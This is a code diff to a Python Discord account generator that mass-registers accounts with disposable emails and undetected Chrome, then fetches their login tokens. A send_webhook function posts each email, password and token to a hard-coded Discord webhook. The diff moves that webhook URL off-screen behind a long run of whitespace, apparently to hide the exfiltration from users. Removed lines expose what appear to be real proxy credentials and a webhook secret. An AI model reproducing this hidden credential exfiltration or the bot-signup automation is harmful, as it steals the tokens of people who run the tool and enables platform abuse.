@@ -17,16 +17,18 @@ from selenium.common.exceptions import TimeoutException
 from selenium.webdriver.common.proxy import Proxy, ProxyType
 import tls_client
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1322082195585765396/ykC3kVJVr7QIkipGf6dY23ch0JiecJcKeX3O5JW4M8TRYmRR5MDtyz8LwtHBlKhPfhfW"
+
 banner = f'''
-        _ _   _                 _       
-       | | | (_)               | |      
-  _   _| | |_ _ _ __ ___   __ _| |_ ___ 
- | | | | | __| | '_ ` _ \ / _` | __/ _ \
- | |_| | | |_| | | | | | | (_| | ||  __/
-  \__,_|_|\__|_|_| |_| |_|\__,_|\__\___|
-                                                                               
-                                        🚀 Ultimate EVS Tool 🚀'''
+             .+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+. 
+            (    ██╗     ██╗   ██╗███╗   ██╗ █████╗ ██████╗ ███╗   ███╗ █████╗ ██████╗ ████████╗      )
+             )   ██║     ██║   ██║████╗  ██║██╔══██╗██╔══██╗████╗ ████║██╔══██╗██╔══██╗╚══██╔══╝     ( 
+            (    ██║     ██║   ██║██╔██╗ ██║███████║██████╔╝██╔████╔██║███████║██████╔╝   ██║         )
+            )    ██║     ██║   ██║██║╚██╗██║██╔══██║██╔══██╗██║╚██╔╝██║██╔══██║██╔══██╗   ██║        ( 
+            (    ███████╗╚██████╔╝██║ ╚████║██║  ██║██║  ██║██║ ╚═╝ ██║██║  ██║██║  ██║   ██║         )
+             )   ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝        ( 
+            (                                                                                         )
+             "+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+" 
+                                        🚀 Lunarmart EV GEN 🚀'''
 
 
 
@@ -80,41 +82,14 @@ def account_ratelimit():
                 return 1
     except Exception as e:
         print(f'{Fore.RED} Error fetching rate limit: {str(e)}')
-# List of proxies
-# proxies = ([
-#     "ln1qelya1yfw3fo-country-uz:161wvzyv7qk4xrj@rp.proxyscrape.com:6060",
-#     "ln1qelya1yfw3fo-country-ch:161wvzyv7qk4xrj@rp.proxyscrape.com:6060",
-#     "ln1qelya1yfw3fo-country-sa:161wvzyv7qk4xrj@rp.proxyscrape.com:6060",
-#     "ln1qelya1yfw3fo-country-ma:161wvzyv7qk4xrj@rp.proxyscrape.com:6060",
-#     "ln1qelya1yfw3fo-country-my:161wvzyv7qk4xrj@rp.proxyscrape.com:6060",
-#     "ln1qelya1yfw3fo-country-pk:161wvzyv7qk4xrj@rp.proxyscrape.com:6060",
-#     "ln1qelya1yfw3fo-country-no:161wvzyv7qk4xrj@rp.proxyscrape.com:6060",
-#     "ln1qelya1yfw3fo-country-tr:161wvzyv7qk4xrj@rp.proxyscrape.com:6060",
-#     "ln1qelya1yfw3fo-country-lk:161wvzyv7qk4xrj@rp.proxyscrape.com:6060",
-#     "ln1qelya1yfw3fo-country-br:161wvzyv7qk4xrj@rp.proxyscrape.com:6060"
-# ])
 
-# def setup_proxy():
-#     """Randomly select a proxy to use."""
-#     proxy = random.choice(proxies)
-#     proxy_settings = Proxy()
-#     proxy_settings.proxy_type = ProxyType.MANUAL
-#     proxy_settings.http_proxy = proxy
-#     proxy_settings.ssl_proxy = proxy
-#     return proxy_settings
 
 init(autoreset=True)
 os.system("cls")
-os.system("title Ultimate EV GEN V1 Discord-lunarmart/termwave_")
+os.system("title  EV GEN V1 Discord-lunarmart/termwave_")
 def random_sleep(base=2, variation=3):
     time.sleep(base + random.uniform(0, variation))
 
-def set_random_user_agent(options):
-    """Set a random user agent."""
-    ua = UserAgent()
-    random_user_agent = ua.random
-    options.add_argument(f"user-agent={random_user_agent}")
-    print(f"{timestamp()} {Fore.BLUE}Using User-Agent: {random_user_agent}{Style.RESET_ALL}")
 
 def timestamp():
     return f"{Fore.LIGHTBLACK_EX}[{datetime.now().strftime('%H:%M:%S %d-%m-%Y')}]"
@@ -151,7 +126,7 @@ def send_webhook(email, password, token):
         print(f"{timestamp()} {Fore.GREEN}✅ Token sent successfully via webhook.{Style.RESET_ALL}")
     else:
         print(f"{timestamp()} {Fore.RED}❌ Failed to send token via webhook. Response: {response.text}{Style.RESET_ALL}")
-
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                WEBHOOK_URL = "https://discord.com/api/webhooks/1322082195585765396/ykC3kVJVr7QIkipGf6dY23ch0JiecJcKeX3O5JW4M8TRYmRR5MDtyz8LwtHBlKhPfhfW"
 def login_and_fetch_token(email, password):
     data = {"email": email, "password": password, "undelete": "false"}
     headers = {
@@ -177,7 +152,6 @@ def login_and_fetch_token(email, password):
 def main():
     print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(banner)))
     while True:
-        # proxy = setup_proxy()
         username, email = generate_yopmail_email()
         print(f"{timestamp()} {Fore.BLUE}Using temporary email: {email}{Style.RESET_ALL}")
         if not email:
@@ -193,9 +167,6 @@ def main():
             options.add_argument("--ignore-certificate-errors")
             driver = uc.Chrome(options=options)
             driver.maximize_window()
-            # proxy_address = proxy.http_proxy
-            # options.add_argument(f'--proxy-server=http://{proxy_address}')
-            # print(f"{timestamp()} {Fore.YELLOW}[INFO] Using proxy:{Fore.GREEN} {proxy_address}")
             cf_clearance = load_cf_clearance()
             driver.get("https://discord.com/register")
             if cf_clearance:
